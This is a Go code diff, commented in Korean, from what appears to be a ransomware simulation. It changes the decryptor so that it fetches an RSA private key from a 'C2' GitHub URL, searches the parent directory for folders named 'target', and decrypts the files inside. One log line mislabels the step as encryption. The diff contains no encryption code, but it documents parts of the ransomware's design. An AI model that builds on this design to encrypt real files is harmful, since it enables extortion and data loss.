@@ -19,9 +19,10 @@ import (
 
 // 타겟 상수 및 키 주소
 const (
-	TargetDir = "target"
-	Stride    = 50 // 수십 바이트 단위로 점프
-	BlockSize = 16 // AES 블록 크기
+	SearchDir  = ".."     // 상위 디렉토리를 탐색 범위로 지정
+	TargetName = "target" // 탐색할 특정 디렉토리 이름
+	Stride     = 50       // 수십 바이트 단위로 점프
+	BlockSize  = 16       // AES 블록 크기
 	// 깃허브 Raw 주소
 	C2PrivateKeyURL = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/key/private.pem"
 )
@@ -182,22 +183,44 @@ func main() {
 	}
 	fmt.Println("[+] RSA 개인키 성공적으로 수신 및 해독 완료")
 
-	fmt.Printf("[*] '%s' 디렉토리 탐색 및 복호화 시작...\n", TargetDir)
-	err = filepath.WalkDir(TargetDir, func(path string, d os.DirEntry, err error) error {
+	fmt.Printf("[*] '%s' 범위 내에서 '%s' 이름의 디렉토리 탐색 및 복호화 시작...\n", SearchDir, TargetName)
+	err = filepath.WalkDir(SearchDir, func(path string, d os.DirEntry, err error) error {
 		if err != nil {
 			return err
 		}
-		if d.IsDir() {
+
+		if !d.IsDir() {
 			return nil
 		}
 
-		ext := strings.ToLower(filepath.Ext(path))
-		if targetExtensions[ext] {
-			fmt.Printf("[*] 복호화 대상 발견: %s\n", path)
-			if err := decryptFile(path, privateKey); err != nil {
-				fmt.Printf("[-] 파일 복호화 실패 (%s): %v\n", path, err)
+		// 디렉토리 명이 "target"인 경우에만 해당 내부 탐색 수행
+		if d.Name() == TargetName {
+			fmt.Printf("[+] 타겟 디렉토리 발견: %s\n", path)
+
+			err := filepath.WalkDir(path, func(innerPath string, innerD os.DirEntry, innerErr error) error {
+				if innerErr != nil {
+					return innerErr
+				}
+				if innerD.IsDir() {
+					return nil
+				}
+
+				ext := strings.ToLower(filepath.Ext(innerPath))
+				if targetExtensions[ext] {
+					fmt.Printf("[*] 암호화 대상 발견: %s\n", innerPath)
+					if err := decryptFile(innerPath, privateKey); err != nil {
+						fmt.Printf("[-] 파일 복호화 실패 (%s): %v\n", innerPath, err)
+					}
+				}
+				return nil
+			})
+			if err != nil {
+				return err
 			}
+
+			return filepath.SkipDir
 		}
+
 		return nil
 	})
 
